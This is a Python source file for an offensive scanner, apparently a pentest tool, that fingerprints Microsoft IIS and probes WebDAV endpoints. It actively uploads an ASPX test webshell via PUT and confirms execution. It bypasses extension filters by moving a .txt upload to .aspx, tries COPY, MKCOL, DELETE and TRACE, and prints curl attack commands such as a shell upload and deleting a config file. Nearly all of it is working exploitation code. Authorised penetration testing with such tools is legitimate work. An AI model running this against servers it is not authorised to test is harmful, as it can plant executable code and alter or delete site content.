#!/usr/bin/env python3
"""
WebDAVProbe 
Made By Aryan Giri | giriaryan694
IIS Fingerprinting & WebDAV Enumeration with Active Exploitation Testing
"""

import requests
import sys
import argparse
import uuid
from urllib.parse import urljoin, urlparse
from colorama import init, Fore, Style

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                    WebDAVProbe                              ║
║    IIS Fingerprinting & WebDAV Active Exploitation Testing ║
║                                                              ║
║              Made By Aryan Giri | giriaryan694             ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

METHOD_IMPACTS = {
    "OPTIONS": {"risk": "INFO", "description": "Lists available HTTP methods.", "impact": "Low - Information disclosure."},
    "TRACE": {"risk": "MEDIUM", "description": "Echoes back received request.", "impact": "Medium - Enables XST attacks."},
    "GET": {"risk": "INFO", "description": "Retrieves resources.", "impact": "Low - Standard read."},
    "HEAD": {"risk": "INFO", "description": "Retrieves headers only.", "impact": "Low - Reconnaissance."},
    "POST": {"risk": "INFO", "description": "Submits data.", "impact": "Low - Standard form submission."},
    "PUT": {"risk": "CRITICAL", "description": "Uploads files directly.", "impact": "CRITICAL - Allows remote file upload, RCE via webshells."},
    "DELETE": {"risk": "HIGH", "description": "Removes files.", "impact": "High - Can delete configs, deface, disrupt services."},
    "COPY": {"risk": "HIGH", "description": "Copies resources.", "impact": "High - Duplicate shells, copy sensitive files."},
    "MOVE": {"risk": "HIGH", "description": "Moves/renames resources.", "impact": "High - Bypass filters: .txt -> .aspx, relocate payloads."},
    "PROPFIND": {"risk": "MEDIUM", "description": "Directory listing, file metadata.", "impact": "Medium - Enumerate hidden files and structure."},
    "PROPPATCH": {"risk": "MEDIUM", "description": "Modifies properties.", "impact": "Medium - Alter metadata, hide activity."},
    "MKCOL": {"risk": "MEDIUM", "description": "Creates directories.", "impact": "Medium - Store malware, organize attack infra."},
    "LOCK": {"risk": "LOW", "description": "Locks resources.", "impact": "Low - DoS by locking critical files."},
    "UNLOCK": {"risk": "LOW", "description": "Removes locks.", "impact": "Low - Minimal standalone risk."},
    "PATCH": {"risk": "HIGH", "description": "Partial modifications.", "impact": "High - Inject backdoors into existing files."}
}

RISK_COLORS = {"INFO": Fore.BLUE, "LOW": Fore.GREEN, "MEDIUM": Fore.YELLOW, "HIGH": Fore.RED, "CRITICAL": Fore.MAGENTA}

# Global output buffer for file saving
output_buffer = []


def out(text=""):
    """Print and buffer for file output."""
    print(text)
    output_buffer.append(text)


def print_section(title):
    out(f"\n{Fore.CYAN}{'=' * 60}")
    out(f"  {title}")
    out(f"{'=' * 60}{Style.RESET_ALL}")


def print_status(msg, st="info"):
    colors = {"info": Fore.CYAN, "success": Fore.GREEN, "warning": Fore.YELLOW, "error": Fore.RED, "critical": Fore.MAGENTA}
    prefix = {"info": "[*]", "success": "[+]", "warning": "[!]", "error": "[-]", "critical": "[!!!]"}
    out(f"{colors.get(st, Fore.WHITE)}{prefix.get(st, '[*]')} {msg}{Style.RESET_ALL}")


def get_session(auth=None):
    """Create requests session with optional Basic Auth."""
    s = requests.Session()
    if auth:
        s.auth = auth
    return s


def check_iis_fingerprint(url, session):
    print_section("PHASE 1: IIS FINGERPRINTING")
    try:
        resp = session.head(url, timeout=10, allow_redirects=True)
        h = resp.headers
        server = h.get("Server", "NOT FOUND")
        xpowered = h.get("X-Powered-By", "NOT FOUND")
        out(f"\n{Fore.WHITE}Target: {url}\nStatus: {resp.status_code} {resp.reason}")
        out(f"\n{Fore.YELLOW}Headers:\n  Server: {server}\n  X-Powered-By: {xpowered}")
        is_iis = "Microsoft-IIS" in server
        iis_ver = None
        if is_iis:
            try: iis_ver = server.split("Microsoft-IIS/")[1].split()[0]
            except: iis_ver = "Unknown"
        asp = "ASP.NET" in xpowered or "ASP.NET" in server
        out(f"\n{Fore.CYAN}Analysis:")
        if is_iis:
            print_status(f"Microsoft-IIS DETECTED (v{iis_ver})", "success")
            vm = {"5.0": "Win2000", "5.1": "WinXP", "6.0": "Server 2003", "7.0": "Server 2008", "7.5": "Server 2008 R2", "8.0": "Server 2012", "8.5": "Server 2012 R2", "10.0": "Server 2016/2019/2022"}
            out(f"  {Fore.WHITE}  -> {vm.get(iis_ver, 'Unknown')}")
        else:
            print_status("Microsoft-IIS NOT detected", "warning")
        if asp: print_status("ASP.NET detected", "success")
        else: print_status("ASP.NET NOT detected", "warning")
        out(f"\n{Fore.YELLOW}{'-' * 60}")
        print_status("Proceeding to WebDAV regardless...", "info")
        out(f"{'-' * 60}{Style.RESET_ALL}")
        return {"is_iis": is_iis, "iis_version": iis_ver, "asp_detected": asp, "server_header": server, "x_powered_by": xpowered}
    except Exception as e:
        print_status(f"Connection failed: {e}", "error")
        return None


def classify_status(code):
    if code == 401: return "AUTH REQUIRED"
    if code == 403: return "FORBIDDEN"
    if code == 404: return "NOT FOUND"
    if code == 405: return "NOT ALLOWED"
    if code == 501: return "NOT IMPLEMENTED"
    return f"HTTP {code}"


def test_put(endpoint_url, session):
    out(f"\n{Fore.MAGENTA}[ACTIVE TEST] PUT Upload{Style.RESET_ALL}")
    uid = str(uuid.uuid4())[:8]
    fname = f"webdavprobe_{uid}.aspx"
    upload_url = urljoin(endpoint_url + "/", fname)
    shell = '<%@ Page Language="Jscript"%><%Response.Write(1+1);%>'
    try:
        r = session.put(upload_url, data=shell, timeout=10)
        out(f"  PUT {upload_url} -> HTTP {r.status_code}")
        if r.status_code == 401:
            print_status(f"PUT blocked: {classify_status(r.status_code)}", "warning")
            return {"worked": False, "auth_required": True, "url": upload_url, "reason": classify_status(r.status_code)}
        if r.status_code in [200, 201, 204]:
            v = session.get(upload_url, timeout=10)
            out(f"  GET {upload_url} -> HTTP {v.status_code}")
            if v.status_code == 200 and "2" in v.text:
                print_status("PUT WORKED! Webshell executed: 1+1=2", "critical")
                out(f"  {Fore.RED}Payload: {upload_url}")
                return {"worked": True, "url": upload_url, "filename": fname}
            else:
                print_status("PUT uploaded but execution failed", "warning")
                return {"worked": False, "url": upload_url, "reason": "Upload OK, exec failed"}
        else:
            print_status(f"PUT failed: {classify_status(r.status_code)}", "error")
            return {"worked": False, "url": upload_url, "reason": classify_status(r.status_code)}
    except Exception as e:
        print_status(f"PUT error: {e}", "error")
        return {"worked": False, "reason": str(e)}


def test_delete(endpoint_url, uploaded, session):
    out(f"\n{Fore.MAGENTA}[ACTIVE TEST] DELETE File{Style.RESET_ALL}")
    if not uploaded or not uploaded.get("url"):
        print_status("No file to delete. Skipping.", "warning")
        return {"worked": False, "reason": "No file to delete"}
    del_url = uploaded["url"]
    try:
        d = session.delete(del_url, timeout=10)
        out(f"  DELETE {del_url} -> HTTP {d.status_code}")
        if d.status_code == 401:
            print_status(f"DELETE blocked: {classify_status(d.status_code)}", "warning")
            return {"worked": False, "auth_required": True, "url": del_url, "reason": classify_status(d.status_code)}
        v = session.get(del_url, timeout=10)
        out(f"  GET {del_url} -> HTTP {v.status_code}")
        if v.status_code in [404, 410]:
            print_status("DELETE WORKED! File removed.", "success")
            return {"worked": True, "url": del_url}
        else:
            print_status(f"DELETE returned {d.status_code} but file still accessible", "warning")
            return {"worked": False, "url": del_url, "reason": "File still accessible"}
    except Exception as e:
        print_status(f"DELETE error: {e}", "error")
        return {"worked": False, "reason": str(e)}


def test_move(endpoint_url, session):
    out(f"\n{Fore.MAGENTA}[ACTIVE TEST] MOVE Bypass (.txt -> .aspx){Style.RESET_ALL}")
    uid = str(uuid.uuid4())[:8]
    txt = f"webdavprobe_{uid}.txt"
    aspx = f"webdavprobe_{uid}_moved.aspx"
    txt_url = urljoin(endpoint_url + "/", txt)
    aspx_url = urljoin(endpoint_url + "/", aspx)
    shell = '<%@ Page Language="Jscript"%><%Response.Write(1+1);%>'
    try:
        p = session.put(txt_url, data=shell, timeout=10)
        out(f"  PUT {txt_url} -> HTTP {p.status_code}")
        if p.status_code == 401:
            print_status(f"MOVE prep blocked: {classify_status(p.status_code)}", "warning")
            return {"worked": False, "auth_required": True, "reason": f"PUT blocked: {classify_status(p.status_code)}"}
        if p.status_code not in [200, 201, 204]:
            return {"worked": False, "reason": f"PUT .txt failed: {classify_status(p.status_code)}"}
        m = session.request("MOVE", txt_url, headers={"Destination": aspx_url}, timeout=10)
        out(f"  MOVE {txt_url} -> {aspx_url} -> HTTP {m.status_code}")
        if m.status_code == 401:
            print_status(f"MOVE blocked: {classify_status(m.status_code)}", "warning")
            session.delete(txt_url, timeout=5)
            return {"worked": False, "auth_required": True, "reason": classify_status(m.status_code)}
        v = session.get(aspx_url, timeout=10)
        out(f"  GET {aspx_url} -> HTTP {v.status_code}")
        if v.status_code == 200 and "2" in v.text:
            print_status("MOVE WORKED! Filter bypass: .txt -> .aspx executed!", "critical")
            session.delete(txt_url, timeout=5)
            session.delete(aspx_url, timeout=5)
            return {"worked": True, "src": txt_url, "dst": aspx_url}
        else:
            print_status("MOVE completed but .aspx did not execute", "warning")
            session.delete(txt_url, timeout=5)
            return {"worked": False, "reason": "MOVE OK, exec failed"}
    except Exception as e:
        print_status(f"MOVE error: {e}", "error")
        return {"worked": False, "reason": str(e)}


def test_copy(endpoint_url, session):
    out(f"\n{Fore.MAGENTA}[ACTIVE TEST] COPY File{Style.RESET_ALL}")
    uid = str(uuid.uuid4())[:8]
    orig = f"webdavprobe_{uid}.txt"
    copy = f"webdavprobe_{uid}_copy.txt"
    orig_url = urljoin(endpoint_url + "/", orig)
    copy_url = urljoin(endpoint_url + "/", copy)
    content = "WebDAVProbe COPY test"
    try:
        p = session.put(orig_url, data=content, timeout=10)
        out(f"  PUT {orig_url} -> HTTP {p.status_code}")
        if p.status_code == 401:
            print_status(f"COPY prep blocked: {classify_status(p.status_code)}", "warning")
            return {"worked": False, "auth_required": True, "reason": f"PUT blocked: {classify_status(p.status_code)}"}
        if p.status_code not in [200, 201, 204]:
            return {"worked": False, "reason": f"PUT original failed: {classify_status(p.status_code)}"}
        c = session.request("COPY", orig_url, headers={"Destination": copy_url}, timeout=10)
        out(f"  COPY {orig_url} -> {copy_url} -> HTTP {c.status_code}")
        if c.status_code == 401:
            print_status(f"COPY blocked: {classify_status(c.status_code)}", "warning")
            session.delete(orig_url, timeout=5)
            return {"worked": False, "auth_required": True, "reason": classify_status(c.status_code)}
        v = session.get(copy_url, timeout=10)
        out(f"  GET {copy_url} -> HTTP {v.status_code}")
        if v.status_code == 200 and content in v.text:
            print_status("COPY WORKED! File duplicated.", "success")
            session.delete(orig_url, timeout=5)
            session.delete(copy_url, timeout=5)
            return {"worked": True, "src": orig_url, "dst": copy_url}
        else:
            print_status("COPY returned success but copy not accessible", "warning")
            session.delete(orig_url, timeout=5)
            return {"worked": False, "reason": "Copy not accessible"}
    except Exception as e:
        print_status(f"COPY error: {e}", "error")
        return {"worked": False, "reason": str(e)}


def test_mkcol(endpoint_url, session):
    out(f"\n{Fore.MAGENTA}[ACTIVE TEST] MKCOL Directory{Style.RESET_ALL}")
    uid = str(uuid.uuid4())[:8]
    dname = f"webdavprobe_dir_{uid}"
    dir_url = urljoin(endpoint_url + "/", dname + "/")
    try:
        m = session.request("MKCOL", dir_url, timeout=10)
        out(f"  MKCOL {dir_url} -> HTTP {m.status_code}")
        if m.status_code == 401:
            print_status(f"MKCOL blocked: {classify_status(m.status_code)}", "warning")
            return {"worked": False, "auth_required": True, "reason": classify_status(m.status_code)}
        if m.status_code in [200, 201, 204]:
            p = session.request("PROPFIND", dir_url, timeout=10)
            out(f"  PROPFIND {dir_url} -> HTTP {p.status_code}")
            if p.status_code in [200, 207]:
                print_status("MKCOL WORKED! Directory created.", "success")
                return {"worked": True, "url": dir_url}
            else:
                print_status("MKCOL OK but PROPFIND failed", "warning")
                return {"worked": False, "reason": "Dir created but not listable"}
        else:
            print_status(f"MKCOL failed: {classify_status(m.status_code)}", "error")
            return {"worked": False, "reason": classify_status(m.status_code)}
    except Exception as e:
        print_status(f"MKCOL error: {e}", "error")
        return {"worked": False, "reason": str(e)}


def test_propfind(endpoint_url, session):
    out(f"\n{Fore.MAGENTA}[ACTIVE TEST] PROPFIND Listing{Style.RESET_ALL}")
    try:
        h = {"Content-Type": "text/xml", "Depth": "1"}
        b = '<?xml version="1.0" encoding="utf-8"?>\n<propfind xmlns="DAV:"><allprop/></propfind>'
        p = session.request("PROPFIND", endpoint_url, data=b, headers=h, timeout=10)
        out(f"  PROPFIND {endpoint_url} -> HTTP {p.status_code}")
        if p.status_code == 401:
            print_status(f"PROPFIND blocked: {classify_status(p.status_code)}", "warning")
            return {"worked": False, "auth_required": True, "reason": classify_status(p.status_code)}
        if p.status_code in [200, 207] and "xml" in p.headers.get("Content-Type", ""):
            print_status("PROPFIND WORKED! Listing retrieved.", "success")
            items = p.text.count("<D:response>") if "<D:response>" in p.text else p.text.count("<response>")
            out(f"  {Fore.WHITE}Items found: ~{items}")
            return {"worked": True, "items": items}
        else:
            print_status(f"PROPFIND returned {p.status_code} but no valid XML", "warning")
            return {"worked": False, "reason": f"HTTP {p.status_code}, no XML"}
    except Exception as e:
        print_status(f"PROPFIND error: {e}", "error")
        return {"worked": False, "reason": str(e)}


def test_trace(endpoint_url, session):
    out(f"\n{Fore.MAGENTA}[ACTIVE TEST] TRACE Echo{Style.RESET_ALL}")
    try:
        t = session.request("TRACE", endpoint_url, timeout=10)
        out(f"  TRACE {endpoint_url} -> HTTP {t.status_code}")
        if t.status_code == 200 and ("TRACE" in t.text or t.text.startswith("TRACE")):
            print_status("TRACE WORKED! Server echoes - XST possible.", "warning")
            return {"worked": True, "status": t.status_code}
        else:
            print_status(f"TRACE blocked or no echo ({classify_status(t.status_code)})", "info")
            return {"worked": False, "reason": classify_status(t.status_code)}
    except Exception as e:
        print_status(f"TRACE error: {e}", "error")
        return {"worked": False, "reason": str(e)}


def run_active_tests(endpoint_url, methods, session):
    print_section("PHASE 3: ACTIVE EXPLOITATION TESTING")
    out(f"{Fore.YELLOW}Testing which methods actually WORK vs just advertised...{Style.RESET_ALL}")
    results = {}
    uploaded = None
    mu = [m.upper().strip() for m in methods]
    if "PUT" in mu:
        results["PUT"] = test_put(endpoint_url, session)
        if results["PUT"].get("worked"): uploaded = results["PUT"]
    if "DELETE" in mu: results["DELETE"] = test_delete(endpoint_url, uploaded, session)
    if "MOVE" in mu: results["MOVE"] = test_move(endpoint_url, session)
    if "COPY" in mu: results["COPY"] = test_copy(endpoint_url, session)
    if "MKCOL" in mu: results["MKCOL"] = test_mkcol(endpoint_url, session)
    if "PROPFIND" in mu: results["PROPFIND"] = test_propfind(endpoint_url, session)
    if "TRACE" in mu: results["TRACE"] = test_trace(endpoint_url, session)
    return results


def check_webdav(url, session):
    print_section("PHASE 2: WEBDAV ENUMERATION")
    endpoints = ["/", "/webdav", "/dav", "/public", "/share", "/files"]
    all_results = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    for ep in endpoints:
        test_url = urljoin(base, ep)
        out(f"\n{Fore.WHITE}Testing: {test_url}")
        try:
            r = session.options(test_url, timeout=10)
            h = r.headers
            allow = h.get("Allow", "NOT FOUND")
            dav = h.get("DAV", "NOT FOUND")
            out(f"  {Fore.YELLOW}Allow: {allow}\n  DAV:   {dav}")
            enabled = dav != "NOT FOUND" and dav != ""
            if enabled:
                print_status(f"WebDAV ENABLED on {ep}", "critical")
                methods = [m.strip() for m in allow.split(",") if m.strip()]
                out(f"\n{Fore.MAGENTA}+{'='*58}+\n|{'DETAILED METHOD ANALYSIS':^58}|\n+{'='*58}+{Style.RESET_ALL}")
                dangerous = []
                for m in methods:
                    mu = m.upper()
                    info = METHOD_IMPACTS.get(mu, {"risk": "UNKNOWN", "description": "No info.", "impact": "Unknown."})
                    rc = RISK_COLORS.get(info["risk"], Fore.WHITE)
                    out(f"\n{rc}> {mu}\n  Risk: {info['risk']}\n  Desc: {info['description']}\n  Impact: {info['impact']}")
                    if info["risk"] in ["HIGH", "CRITICAL"]: dangerous.append(mu)
                out(f"\n{Fore.CYAN}{'='*60}\n  SUMMARY: {test_url}\n{'='*60}{Style.RESET_ALL}")
                if dangerous:
                    print_status(f"DANGEROUS: {', '.join(dangerous)}", "critical")
                    out(f"\n{Fore.MAGENTA}Attack Scenarios:{Style.RESET_ALL}")
                    if "PUT" in dangerous: out(f"  -> curl -X PUT {test_url}/shell.aspx -d '<%@...%>'")
                    if "DELETE" in dangerous: out(f"  -> curl -X DELETE {test_url}/config")
                    if "MOVE" in dangerous: out(f"  -> curl -X MOVE -H 'Destination:{test_url}/s.aspx' {test_url}/s.txt")
                    if "COPY" in dangerous: out(f"  -> curl -X COPY -H 'Destination:{test_url}/b.aspx' {test_url}/s.aspx")
                    if "PROPFIND" in dangerous: out(f"  -> curl -X PROPFIND {test_url}")
                active = run_active_tests(test_url, methods, session)
                all_results.append({"endpoint": ep, "url": test_url, "webdav_enabled": True, "dav_header": dav, "methods": methods, "dangerous_methods": dangerous, "active_tests": active})
            else:
                print_status(f"WebDAV NOT on {ep}", "info")
                all_results.append({"endpoint": ep, "url": test_url, "webdav_enabled": False})
        except Exception as e:
            print_status(f"Error on {ep}: {e}", "error")
            all_results.append({"endpoint": ep, "url": test_url, "error": str(e)})
    return all_results


def generate_report(url, iis_data, webdav_data):
    print_section("FINAL REPORT")
    out(f"\n{Fore.CYAN}Target: {url}\n{'-'*60}")
    if iis_data:
        out(f"\n{Fore.YELLOW}[IIS Fingerprinting]{Style.RESET_ALL}")
        out(f"  IIS: {iis_data['is_iis']} | Version: {iis_data['iis_version'] or 'N/A'} | ASP.NET: {iis_data['asp_detected']}")
    webdav_found = any(r.get("webdav_enabled") for r in webdav_data if "error" not in r)
    out(f"\n{Fore.YELLOW}[WebDAV]{Style.RESET_ALL}\n  Enabled: {webdav_found}")
    for r in webdav_data:
        if r.get("webdav_enabled"):
            out(f"\n  {Fore.RED}[+] {r['url']}\n    DAV: {r['dav_header']}\n    Methods: {', '.join(r['methods'])}")
            if r['dangerous_methods']: out(f"    {Fore.MAGENTA}DANGEROUS: {', '.join(r['dangerous_methods'])}")
    out(f"\n{Fore.MAGENTA}{'='*60}\n  ACTIVE TEST RESULTS - WHAT ACTUALLY WORKED\n{'='*60}{Style.RESET_ALL}")
    any_worked = False
    any_auth = False
    for r in webdav_data:
        if r.get("active_tests"):
            out(f"\n{Fore.CYAN}Endpoint: {r['url']}{Style.RESET_ALL}")
            out(f"  {'Method':<12} {'Advertised':<12} {'Worked':<12} {'Details'}")
            out(f"  {'-'*60}")
            for method, result in r["active_tests"].items():
                adv = f"{Fore.GREEN}YES" if method.upper() in [m.upper() for m in r["methods"]] else f"{Fore.RED}NO"
                if result.get("worked"):
                    worked = f"{Fore.GREEN}WORKED"
                    any_worked = True
                elif result.get("auth_required"):
                    worked = f"{Fore.YELLOW}AUTH REQ"
                    any_auth = True
                else:
                    worked = f"{Fore.RED}FAILED"
                det = result.get("reason", "") if not result.get("worked") else "Success"
                if result.get("worked") and "url" in result: det = f"Payload: {result['url']}"
                out(f"  {Fore.WHITE}{method:<12}{adv:<12}{worked}{Style.RESET_ALL}  {det}")
    if any_auth and not any_worked:
        out(f"\n{Fore.YELLOW}[!] Methods advertised but require authentication (HTTP 401). Try --auth user:pass{Style.RESET_ALL}")
    elif not any_worked:
        out(f"\n{Fore.YELLOW}[!] No exploitation worked. Methods advertised but blocked by controls.{Style.RESET_ALL}")
    out(f"\n{Fore.GREEN}{'='*60}\n  Scan Complete - Made By Aryan Giri | giriaryan694\n{'='*60}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="WebDAVProbe v2.1 - IIS & WebDAV Active Testing", epilog="Example: python3 webdavprobe.py -u http://10.48.172.90 --auth admin:password -o report.txt")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--auth", default=None, help="Basic auth credentials (user:pass)")
    parser.add_argument("-o", "--output", default=None, help="Save report to file")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout seconds")
    args = parser.parse_args()

    print(BANNER)

    url = args.url
    if not url.startswith(("http://", "https://")): url = "http://" + url

    auth = None
    if args.auth:
        try:
            u, p = args.auth.split(":", 1)
            auth = (u, p)
            print_status(f"Using Basic Auth: {u}:***", "info")
        except:
            print_status("Invalid auth format. Use: user:pass", "error")
            sys.exit(1)

    session = get_session(auth)

    iis_data = check_iis_fingerprint(url, session)
    if iis_data is None:
        print_status("Target unreachable", "error")
        sys.exit(1)

    webdav_data = check_webdav(url, session)
    generate_report(url, iis_data, webdav_data)

    if args.output:
        # Strip ANSI codes for file output
        import re
        clean = re.sub(r'\x1b\[[0-9;]*m', '', "\n".join(output_buffer))
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(clean)
        print(f"\n{Fore.GREEN}[+] Report saved to: {args.output}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
